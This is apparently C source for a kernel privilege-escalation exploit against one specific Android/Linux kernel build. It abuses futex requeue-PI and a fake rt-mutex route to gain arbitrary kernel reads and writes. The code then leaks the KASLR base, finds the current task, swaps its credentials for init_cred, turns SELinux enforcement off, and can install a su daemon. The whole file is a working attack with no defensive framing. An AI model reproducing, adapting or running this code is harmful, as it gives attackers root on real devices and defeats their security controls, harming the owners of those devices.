#include "common.h"
#include "reclaim_capture_gate.h"
#include "perf_reclaim_gate.h"

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
uint64_t kaslr_base;
uint64_t kaslr_slide;

#define DIRECT_ROUTE_ATTEMPTS 3
#define DIRECT_READ_ATTEMPTS 10
#define DIRECT_EFFECT_ATTEMPTS 10

static int verify_target_kernel(void) {
  char version[512];
  read_first_line("/proc/version", version, sizeof(version));
  int release_ok = strstr(version, TARGET_KERNEL_RELEASE) != NULL;
  int build_ok = strstr(version, TARGET_SLOT_A_VERSION_MARKER) != NULL ||
                 strstr(version, TARGET_SLOT_B_VERSION_MARKER) != NULL;
  if (!release_ok || !build_ok) {
    pr_warning("unsupported kernel; refusing exploit: %s\n", version);
    return 0;
  }
  pr_success("target kernel accepted: %s\n", version);
  return 1;
}

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);

  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
        int sched_errno = errno;
        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
        } else {
          pr_info("consumer sched_setattr seq=%d ret=%ld errno=%d tid=%d "
                  "fake_lock=%016zx fake_w0=%016zx\n",
                  seq, sched_ret, sched_errno, tid, fake_lock, fake_w0);
        }
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
}

void run_main_route_threads(void) {
  reset_main_route_state();

  if (!prepare_pselect_fake_lock_route()) {
    pr_error("main waiter stamp prepare failed errno=%d\n", errno);
  }

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);

  while (!atomic_load(&route_done)) {
    usleep(10000);
  }
}

static int direct_read_boot_id_raw(unsigned char raw[16]) {
  char text[64];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("direct boot_id open failed errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, text, sizeof(text) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    pr_warning("direct boot_id read failed ret=%zd errno=%d\n",
               n, saved_errno);
    return 0;
  }
  text[n] = 0;

  int high = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int value = hex_value(text[i]);
    if (value < 0) {
      continue;
    }
    if (high < 0) {
      high = value;
    } else {
      raw[out++] = (unsigned char)((high << 4) | value);
      high = -1;
    }
  }
  if (out != 16) {
    pr_warning("direct boot_id parse failed bytes=%d ret=%zd\n", out, n);
    return 0;
  }
  return 1;
}

enum direct_r64_result {
  DIRECT_R64_FATAL = -1,
  DIRECT_R64_RETRY = 0,
  DIRECT_R64_OK = 1,
};

static int direct_pin_verify_cpu(
    const char *phase, const char *name, int attempt, int idx, int *cpu_out) {
  pin_to_core((size_t)direct_root_cpu);
  errno = 0;
  int cpu = sched_getcpu();
  int saved_errno = errno;
  if (cpu_out) {
    *cpu_out = cpu;
  }
  if (cpu != direct_root_cpu) {
    pr_error("direct-r64-fatal name=%s phase=%s attempt=%d idx=%d "
             "reason=cpu-mismatch expected_cpu=%u observed_cpu=%d errno=%d "
             "pid=%d tid=%ld\n",
             name, phase, attempt, idx, direct_root_cpu, cpu, saved_errno,
             getpid(), syscall(SYS_gettid));
    return 0;
  }
  return 1;
}

static int direct_read_shape0_exact64_once(
    uintptr_t q, uint64_t *value, const char *name,
    int attempt, int *write_idx) {
  /*
   * The shape-0 oracle anchor b is the runtime address of the boot_id
   * sysctl .data slot.  Use the virtual kimg alias: it is memstart-
   * independent and always exact once the slide stage recovered
   * kaslr_base (the direct stage only runs after that).  The linear
   * alias would additionally require the per-boot memstart draw to be
   * compensated (AI_PIN_LINEAR_SLIDE), which mode-2 runs do not carry.
   */
  const uintptr_t b = kaslr_image_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE);

  /*
   * Q must be a readable kernel address whose +8 qword is writable (the
   * sidecar collateral lands there); the callers tighten the address
   * domain (kimg .data for S4a, direct map for S4b).
   */
  if (!value || !write_idx || !is_kernel_ptr(b) || !is_kernel_ptr(q) ||
      (b & 7) != 0 || (q & 7) != 0 || q > UINTPTR_MAX - 16) {
    pr_error("direct-r64-fatal name=%s phase=precheck attempt=%d "
             "reason=bad-address B=%016zx Q=%016zx Q8=%016zx Q16=%016zx\n",
             name, attempt, b, q, q + 8, q + 16);
    return DIRECT_R64_FATAL;
  }

  int idx = (*write_idx)++;
  int cpu_before = -1;
  int cpu_after_trigger = -1;
  int cpu_after_read = -1;
  if (!direct_pin_verify_cpu(
          "before-shape0", name, attempt, idx, &cpu_before)) {
    return DIRECT_R64_FATAL;
  }

  pr_success("direct-r64-plan name=%s attempt=%d/%d idx=%d shape=0 "
             "cpu=%d pid=%d tid=%ld B=%016zx Q=%016zx Q8=%016zx Q16=%016zx\n",
             name, attempt, DIRECT_READ_ATTEMPTS, idx, cpu_before,
             getpid(), syscall(SYS_gettid), b, q, q + 8, q + 16);

  if (!direct_pselect_write_once(b, q, 0, idx)) {
    pr_warning("direct-r64-retry name=%s attempt=%d idx=%d "
               "reason=primitive-miss B=%016zx Q=%016zx\n",
               name, attempt, idx, b, q);
    return DIRECT_R64_RETRY;
  }

  /* 子进程退出后，父线程必须先回到 CPU7，才能读取 CPU7 的 __entry_task。 */
  if (!direct_pin_verify_cpu(
          "after-shape0", name, attempt, idx, &cpu_after_trigger)) {
    return DIRECT_R64_FATAL;
  }

  unsigned char raw[16] = {0};
  if (!direct_read_boot_id_raw(raw)) {
    pr_error("direct-r64-fatal name=%s phase=proc-read attempt=%d idx=%d "
             "reason=read-or-parse-failed triggered=1 B=%016zx Q=%016zx\n",
             name, attempt, idx, b, q);
    return DIRECT_R64_FATAL;
  }

  if (!direct_pin_verify_cpu(
          "after-proc-read", name, attempt, idx, &cpu_after_read)) {
    return DIRECT_R64_FATAL;
  }

  uint64_t got = 0;
  uint64_t sidecar = 0;
  memcpy(&got, raw, sizeof(got));
  memcpy(&sidecar, raw + 8, sizeof(sidecar));
  unsigned int expected_raw8 = (unsigned int)(b & 0xff);
  int oracle_ok = sidecar == (uint64_t)b && raw[8] == expected_raw8;

  pr_success("direct-r64-oracle name=%s attempt=%d idx=%d shape=0 "
             "cpu_before=%d cpu_after_trigger=%d cpu_after_read=%d "
             "value=%016llx sidecar=%016llx expected_sidecar=%016zx "
             "raw8=%02x expected_raw8=%02x ok=%d\n",
             name, attempt, idx, cpu_before, cpu_after_trigger, cpu_after_read,
             (unsigned long long)got, (unsigned long long)sidecar, b,
             (unsigned int)raw[8], expected_raw8, oracle_ok);
  if (!oracle_ok) {
    pr_error("direct-r64-fatal name=%s phase=oracle attempt=%d idx=%d "
             "reason=shape0-poststate-mismatch triggered=1\n",
             name, attempt, idx);
    return DIRECT_R64_FATAL;
  }

  *value = got;
  return DIRECT_R64_OK;
}

static int direct_trigger_write64(
    const char *name, uintptr_t target, uintptr_t value,
    int shape, int *write_idx) {
  for (int attempt = 1; attempt <= DIRECT_ROUTE_ATTEMPTS; attempt++) {
    int idx = (*write_idx)++;
    pr_success("direct-step %s attempt=%d/%d target=%016zx value=%016zx\n",
               name, attempt, DIRECT_ROUTE_ATTEMPTS, target, value);
    if (direct_pselect_write_once(target, value, shape, idx)) {
      return 1;
    }
  }
  return 0;
}

static int direct_read_enforcing(void);

static int direct_trigger_write64_followup(
    const char *name, uintptr_t target, uintptr_t value, int shape,
    uintptr_t followup_target, int *write_idx) {
  for (int attempt = 1; attempt <= DIRECT_EFFECT_ATTEMPTS; attempt++) {
    int idx = (*write_idx)++;
    int followup_idx = *write_idx;
    *write_idx += DIRECT_FOLLOWUP_ATTEMPTS;
    pr_success("direct-step %s attempt=%d/%d target=%016zx value=%016zx "
               "followup=%016zx\n",
               name, attempt, DIRECT_EFFECT_ATTEMPTS, target, value,
               followup_target);
    int route_ok = direct_pselect_write_followup_once(
        target, value, shape, idx, followup_target, followup_idx);
    int enforcing_now = direct_read_enforcing();
    uid_t uid_now = getuid();
    pr_success("direct-effect %s attempt=%d/%d route=%d uid=%u euid=%u "
               "selinux=%d\n",
               name, attempt, DIRECT_EFFECT_ATTEMPTS, route_ok, uid_now,
               geteuid(), enforcing_now);
    if (route_ok && enforcing_now == 0 && uid_now != 2000) {
      return 1;
    }
  }
  return 0;
}

static int direct_trigger_write64_until_routed(
    const char *name, uintptr_t target, uintptr_t value, int shape,
    int *write_idx) {
  /*
   * A successful child already proves the pselect consumer ran over a
   * perf-verified same-PFN reclaim.  Retry only route misses: repeating an
   * already successful kernel write adds no information and multiplies the
   * chance of hitting an unrelated rt-mutex failure.
   */
  for (int attempt = 1; attempt <= DIRECT_EFFECT_ATTEMPTS; attempt++) {
    pr_success("direct-until-routed %s attempt=%d/%d target=%016zx "
               "value=%016zx\n",
               name, attempt, DIRECT_EFFECT_ATTEMPTS, target, value);
    if (direct_trigger_write64(name, target, value, shape, write_idx)) {
      pr_success("direct-until-routed-result %s routed=1 attempt=%d/%d "
                 "uid=%u euid=%u selinux=%d\n",
                 name, attempt, DIRECT_EFFECT_ATTEMPTS, getuid(), geteuid(),
                 direct_read_enforcing());
      return 1;
    }
  }
  pr_success("direct-until-routed-result %s routed=0 attempts=%d uid=%u "
             "euid=%u selinux=%d\n",
             name, DIRECT_EFFECT_ATTEMPTS, getuid(), geteuid(),
             direct_read_enforcing());
  return 0;
}

static int direct_read_enforcing(void) {
  char value[16];
  read_first_line("/sys/fs/selinux/enforce", value, sizeof(value));
  if (value[0] == '0' && value[1] == 0) {
    return 0;
  }
  if (value[0] == '1' && value[1] == 0) {
    return 1;
  }
  return -1;
}

static int direct_reload_selinux_policy(size_t *policy_size) {
  int policy_fd = open("/sys/fs/selinux/policy", O_RDONLY | O_CLOEXEC);
  if (policy_fd < 0) {
    return 0;
  }
  struct stat st;
  if (fstat(policy_fd, &st) != 0 || st.st_size <= 0 ||
      st.st_size > 32 * 1024 * 1024) {
    close(policy_fd);
    return 0;
  }
  size_t len = (size_t)st.st_size;
  unsigned char *policy = malloc(len);
  if (!policy) {
    close(policy_fd);
    return 0;
  }
  size_t done = 0;
  while (done < len) {
    ssize_t got = read(policy_fd, policy + done, len - done);
    if (got < 0 && errno == EINTR) {
      continue;
    }
    if (got <= 0) {
      free(policy);
      close(policy_fd);
      return 0;
    }
    done += (size_t)got;
  }
  close(policy_fd);

  int load_fd = open("/sys/fs/selinux/load", O_WRONLY | O_CLOEXEC);
  if (load_fd < 0) {
    free(policy);
    return 0;
  }
  ssize_t wrote;
  do {
    wrote = write(load_fd, policy, len);
  } while (wrote < 0 && errno == EINTR);
  int saved_errno = errno;
  close(load_fd);
  free(policy);
  errno = saved_errno;
  if (wrote != (ssize_t)len) {
    return 0;
  }
  if (policy_size) {
    *policy_size = len;
  }
  return 1;
}

static int direct_run_id(void) {
  pid_t child = fork();
  if (child < 0) {
    return 0;
  }
  if (child == 0) {
    execl("/system/bin/id", "id", (char *)NULL);
    _exit(127);
  }

  int status = 0;
  for (;;) {
    pid_t got = waitpid(child, &status, 0);
    if (got == child) {
      break;
    }
    if (got < 0 && errno == EINTR) {
      continue;
    }
    return 0;
  }
  return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

static int run_direct_root_stage(void) {
  int write_idx = 0;

  pr_success("direct mode=init_cred runtime_cpu=%d\n", direct_root_cpu);
  pr_success("direct-step direct_root_enter uid=%u pid=%d\n",
             getuid(), getpid());

  int entry_cpu = -1;
  if (!direct_pin_verify_cpu(
          "root-enter", "root-stage", 0, write_idx, &entry_cpu)) {
    return 0;
  }
  pr_success("direct-root-parent cpu=%d pid=%d tid=%ld\n",
             entry_cpu, getpid(), syscall(SYS_gettid));

  uintptr_t percpu_base = canon_addr(PER_CPU_OFFSET);
  if (direct_root_cpu < 0 ||
      percpu_base > UINTPTR_MAX - (uintptr_t)direct_root_cpu * 8) {
    return 0;
  }
  uintptr_t percpu_slot =
      percpu_base + (uintptr_t)direct_root_cpu * sizeof(uint64_t);
  if (!is_kernel_ptr(percpu_slot) || (percpu_slot & 7) != 0) {
    pr_error("direct-percpu-fatal cpu=%d base=%016zx slot=%016zx\n",
             direct_root_cpu, percpu_base, percpu_slot);
    return 0;
  }

  uint64_t percpu_delta = 0;
  uintptr_t entry_slot = 0;
  for (int attempt = 1; attempt <= DIRECT_READ_ATTEMPTS; attempt++) {
    int rr = direct_read_shape0_exact64_once(
        percpu_slot, &percpu_delta, "per_cpu_offset", attempt, &write_idx);
    if (rr == DIRECT_R64_RETRY) {
      continue;
    }
    if (rr != DIRECT_R64_OK) {
      return 0;
    }

    uintptr_t entry_base = canon_addr(ENTRY_TASK);
    uintptr_t stale_nfulnl = canon_addr(SLIDE_NFULNL_LOGGER_IMAGE);
    int delta_nonzero = percpu_delta != 0;
    int delta_aligned = (percpu_delta & (PAGE_SIZE - 1)) == 0;
    int delta_bounded = percpu_delta < (1ULL << 39);
    int stale_slide_value = percpu_delta == (uint64_t)stale_nfulnl;
    int addition_safe = delta_bounded &&
                        entry_base <= UINTPTR_MAX - (uintptr_t)percpu_delta;
    entry_slot = addition_safe
                     ? entry_base + (uintptr_t)percpu_delta
                     : 0;
    int entry_direct = is_direct_ptr(entry_slot);
    int entry_aligned = (entry_slot & 7) == 0;
    pr_success("direct-percpu cpu=%d base=%016zx slot=%016zx "
               "delta=%016llx nonzero=%d page_aligned=%d bounded=%d "
               "stale_nfulnl=%d entry_slot=%016zx direct=%d aligned=%d\n",
               direct_root_cpu, percpu_base, percpu_slot,
               (unsigned long long)percpu_delta, delta_nonzero,
               delta_aligned, delta_bounded, stale_slide_value,
               entry_slot, entry_direct, entry_aligned);
    if (!delta_nonzero || !delta_aligned || !delta_bounded ||
        stale_slide_value || !addition_safe ||
        !entry_direct || !entry_aligned) {
      pr_warning("direct-percpu-retry attempt=%d/%d "
                 "reason=bad-derived-entry cpu=%d delta=%016llx\n",
                 attempt, DIRECT_READ_ATTEMPTS, direct_root_cpu,
                 (unsigned long long)percpu_delta);
      entry_slot = 0;
      percpu_delta = 0;
      continue;
    }
    break;
  }
  if (!entry_slot) {
    pr_warning("direct per-cpu entry slot derivation exhausted cpu=%d\n",
               direct_root_cpu);
    return 0;
  }
  pr_success("direct entry_slot=%016zx cpu=%d delta=%016llx\n",
             entry_slot, direct_root_cpu,
             (unsigned long long)percpu_delta);

  uint64_t task = 0;
  for (int attempt = 1; attempt <= DIRECT_READ_ATTEMPTS; attempt++) {
    int rr = direct_read_shape0_exact64_once(
        entry_slot, &task, "entry_task", attempt, &write_idx);
    if (rr == DIRECT_R64_RETRY) {
      continue;
    }
    if (rr != DIRECT_R64_OK) {
      return 0;
    }

    int task_direct = task != 0 && is_direct_ptr((uintptr_t)task);
    int task_aligned = (task & 7) == 0;
    int cpu_now = sched_getcpu();
    pr_success("direct-entry cpu=%d observed_cpu=%d slot=%016zx "
               "task=%016llx direct=%d aligned=%d pid=%d tid=%ld\n",
               direct_root_cpu, cpu_now, entry_slot,
               (unsigned long long)task, task_direct, task_aligned,
               getpid(), syscall(SYS_gettid));
    if (cpu_now != direct_root_cpu ||
        !task_direct || !task_aligned) {
      pr_warning("direct-entry-retry attempt=%d/%d "
                 "reason=bad-task-or-cpu expected_cpu=%d "
                 "observed_cpu=%d task=%016llx\n",
                 attempt, DIRECT_READ_ATTEMPTS, direct_root_cpu,
                 cpu_now, (unsigned long long)task);
      task = 0;
      continue;
    }
    break;
  }
  if (!task) {
    pr_warning("direct current task leak exhausted cpu=%d\n",
               direct_root_cpu);
    return 0;
  }
  pr_success("direct entry sample task=%016llx pid=%d cpu=%d\n",
             (unsigned long long)task, getpid(), direct_root_cpu);

  int enforcing = direct_read_enforcing();
  if (enforcing < 0) {
    pr_error("direct cannot read selinux enforcing state\n");
    return 0;
  }
  pr_success("direct pre-cred selinux preserved enforcing=%d\n", enforcing);

  uintptr_t init_cred = canon_addr(INIT_CRED);
  uintptr_t real_cred_slot = (uintptr_t)task + TASK_REAL_CRED_OFF;
  uintptr_t cred_slot = (uintptr_t)task + TASK_CRED_OFF;
  pr_success("direct-step before_init_cred uid=%u pid=%d task=%016llx\n",
             getuid(), getpid(), (unsigned long long)task);

  if (!direct_trigger_write64_until_routed(
          "install_real_cred", real_cred_slot, init_cred, 1, &write_idx)) {
    pr_error("direct real_cred install routes exhausted\n");
    return 0;
  }
  if (getuid() != 2000 || geteuid() != 2000 ||
      direct_read_enforcing() != 1) {
    pr_error("direct real_cred stage changed current credentials or SELinux\n");
    return 0;
  }
  uintptr_t selinux_target = canon_addr(SELINUX_ENFORCING);
  if (!direct_trigger_write64_followup(
          "install_cred_then_selinux_zero", cred_slot, init_cred, 1,
          selinux_target, &write_idx)) {
    pr_error("direct cred install failed\n");
    return 0;
  }

  /*
   * S4d2 repair (single write; fleet/code-review.md B1+M2): the two
   * shape-1 installs collateral-write (task+slot-8)|color into
   * init_cred[0], corrupting usage AND uid/gid.  A childless shape-1
   * write (right=left=0 -> leaf rb_erase, no collateral) at
   * init_cred+4 zeroes uid/gid/suid/sgid while LEAVING usage as the
   * odd nonzero collateral value: atomic_dec_and_test can only free
   * init_cred at exactly 0, which an odd garbage count never reaches.
   * (Zeroing init_cred+0 instead would leave usage=0: one fork/exit
   * pair -> put_cred_rcu frees the static init_cred.  A repair at
   * init_cred-8 zeroes init_groups instead — both are wrong.)
   */
  int repair_ok = 0;
  for (int attempt = 1; attempt <= DIRECT_EFFECT_ATTEMPTS; attempt++) {
    int route_ok = direct_trigger_write64(
        "repair_init_cred", init_cred + 4, 0, 1, &write_idx);
    repair_ok = getuid() == 0 && geteuid() == 0 &&
                getgid() == 0 && getegid() == 0;
    pr_success("direct-effect repair_init_cred attempt=%d/%d route=%d "
               "uid=%u euid=%u gid=%u egid=%u repaired=%d\n",
               attempt, DIRECT_EFFECT_ATTEMPTS, route_ok,
               getuid(), geteuid(), getgid(), getegid(), repair_ok);
    if (route_ok && repair_ok) {
      break;
    }
  }
  if (!repair_ok) {
    pr_error("direct init_cred repair exhausted without zero IDs\n");
    return 0;
  }

  if (!restore_initial_affinity()) {
    pr_error("restore initial CPU affinity failed errno=%d\n", errno);
    return 0;
  }

  size_t policy_size = 0;
  if (!direct_reload_selinux_policy(&policy_size)) {
    pr_error("direct selinux policy repair failed errno=%d\n", errno);
    return 0;
  }
  int enforcing_after = direct_read_enforcing();
  pr_success("direct credential result uid=%u euid=%u gid=%u egid=%u "
             "task=%016llx init_cred=%016zx selinux=%d->%d "
             "policy_reload=%zu\n",
             getuid(), geteuid(), getgid(), getegid(),
             (unsigned long long)task, init_cred, enforcing, enforcing_after,
             policy_size);

  int id_ok = direct_run_id();
  pid_t su_daemon_pid = -1;
  int su_ok = 0;
  int su_errno = 0;
  const char *install_su = getenv("AI_PIN_INSTALL_SU");
  if (install_su && strcmp(install_su, "1") == 0) {
    errno = 0;
    su_ok = install_embedded_su(&su_daemon_pid);
    su_errno = errno;
  }
  int root_ok = getuid() == 0 && geteuid() == 0 &&
                getgid() == 0 && getegid() == 0 && id_ok &&
                enforcing == 1 && enforcing_after == 0;
  pr_success("direct-root-summary root=%d id=%d optional_su=%d/%d daemon=%d "
             "selinux=%d->%d uid=%u euid=%u gid=%u egid=%u\n",
             root_ok, id_ok, su_ok, su_errno, su_daemon_pid,
             enforcing, enforcing_after,
             getuid(), geteuid(), getgid(), getegid());
  return root_ok;
}

int run_exploit(int argc, char **argv) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  (void)argc;
  (void)argv;
  if (!verify_target_kernel()) {
    return 3;
  }
  if (!init_direct_root_cpu()) {
    pr_error("runtime performance CPU detection failed errno=%d\n", errno);
    return 1;
  }
  if (!p0_env_init()) {
    return 1;
  }
  if (!ghostlock_perf_gate_init()) {
    pr_warning("perf reclaim gate initialization failed errno=%d\n", errno);
    return 1;
  }
  if (ghostlock_perf_gate_enabled()) {
    const struct ghostlock_perf_gate_result *perf_gate =
        ghostlock_perf_gate_result();
    pr_success("perf reclaim gate armed trace_free=239 trace_alloc=241 "
               "pfn_range=%llx-%llx\n",
               (unsigned long long)perf_gate->zone_start_pfn,
               (unsigned long long)perf_gate->zone_end_pfn);
  }
  if (!ghostlock_capture_gate_init()) {
    pr_warning("reclaim capture gate initialization failed errno=%d\n", errno);
    return 1;
  }
  if (ghostlock_capture_gate_enabled()) {
    const char *trace = getenv("AI_PIN_PREPARE_TRACE");
    if (!trace || strcmp(trace, "1") != 0 || !prepare_reclaim_trace_init()) {
      pr_warning("reclaim capture gate requires live trace control errno=%d\n",
                 errno);
      ghostlock_capture_gate_close();
      return 1;
    }
    pr_success("reclaim capture gate armed token=%s\n",
               ghostlock_capture_gate_token());
  }
  log_startup_context();

  pin_to_core(CORE);
  const char *kaslr_only = getenv("AI_PIN_KASLR_ONLY");
  if (kaslr_only && strcmp(kaslr_only, "1") == 0) {
    if (!slide_tracefs_leak_kernel_base()) {
      pr_warning("kaslr-only tracefs measurement failed errno=%d\n", errno);
      return 1;
    }
    pr_success("kaslr-only stage done base=%016llx slide=%016llx "
               "trigger=disabled\n",
               (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    return 0;
  }
  const char *prepare_only = getenv("AI_PIN_PREPARE_ONLY");
  if (prepare_only && strcmp(prepare_only, "1") == 0) {
    pr_success("prepare-only requested; GhostLock trigger is disabled\n");
    if (!prepare_reclaim_trace_init()) {
      pr_warning("prepare-only trace control failed errno=%d\n", errno);
      return 1;
    }
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock || !fake_w0 || !fake_task) {
      pr_warning("prepare-only failed before trigger base=%016zx\n", page_base);
      close_reclaim_sockets();
      cleanup_page_prepare_state();
      prepare_reclaim_trace_close();
      return 1;
    }
    pr_success("prepare-only stage done base=%016zx fake_lock=%016zx "
               "fake_w0=%016zx fake_task=%016zx trigger=disabled\n",
               page_base, fake_lock, fake_w0, fake_task);
    close_reclaim_sockets();
    cleanup_page_prepare_state();
    page_base = 0;
    fake_lock = 0;
    fake_w0 = 0;
    fake_task = 0;
    prepare_reclaim_trace_close();
    return 0;
  }

  if (!slide_leak_kernel_base()) {
    pr_error("slide kaslr leak failed\n");
    return 1;
  }
  pr_success("slide stage done base=%016llx slide=%016llx\n",
             (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide);

  /*
   * Validation mode: stop after the slide stage.  The direct stage needs
   * its own per-boot validation and must not run as a side effect of a
   * slide-stage experiment.
   */
  const char *slide_only = getenv("AI_PIN_SLIDE_ONLY");
  if (slide_only && strcmp(slide_only, "1") == 0) {
    pr_success("slide-only run requested; skipping direct stage "
               "base=%016llx slide=%016llx\n",
               (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    close_reclaim_sockets();
    cleanup_page_prepare_state();
    return 0;
  }

  /*
   * slide 的 skb 已经被子进程消费，KASLR 也已读回；在父进程中释放本代
   * reclaim socket 与残留 mm pin，避免 direct worker 只关闭继承副本、
   * 而父进程仍把旧 partial slab 保活。
   */
  close_reclaim_sockets();
  cleanup_page_prepare_state();
  page_base = 0;
  fake_lock = 0;
  fake_w0 = 0;
  fake_task = 0;
  pr_info("slide generation released before direct stage\n");

  return run_direct_root_stage() ? 0 : 2;
}
